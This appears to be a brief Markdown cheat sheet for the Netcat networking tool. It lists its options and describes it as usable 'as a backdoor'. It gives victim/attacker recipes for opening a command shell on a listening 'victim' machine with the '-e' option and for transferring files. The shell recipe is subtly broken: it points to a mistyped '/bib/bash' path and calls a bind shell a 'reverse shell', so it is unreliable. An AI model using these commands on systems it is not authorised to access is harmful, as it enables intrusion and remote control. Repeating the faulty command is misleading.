# NETCAT

Netcat functions as a back-end tool that allows for port scanning and port listening. In addition, you can actually transfer files directly through Netcat or use it as a backdoor into other networked systems. Partnered with a tool like Varonis Edge, you would receive an alert of any unusual activity and could then use Netcat to investigate. Lastly, Netcat is a flexible tool because of how it can be scripted for larger tasks.

** Syntax **

> # nc [options] hostname port [port]

# Options

* No DNS lookup :

> -n

* Verbose output :

> -v

* To specify the port to connect :

> -p

* For listening :

> nc -l [port_no]

* For help :

> nc -h

* For connecting to specified IP and port :

> nc [IP] [port]

* For executing commands :

> -e [command]

* For reverse shell :

      In victim's machine
      
      > nc -l -p [port] -e /bib/bash

      In attacker's machine
      
      > nc [IP] [port]

* Remote file transfering :

      In victim's machine
      
     > nc -l -p [port] > filename

      In attacker's machine
      
     > cat '/path_to_file/filename' | nc [IP] [port]


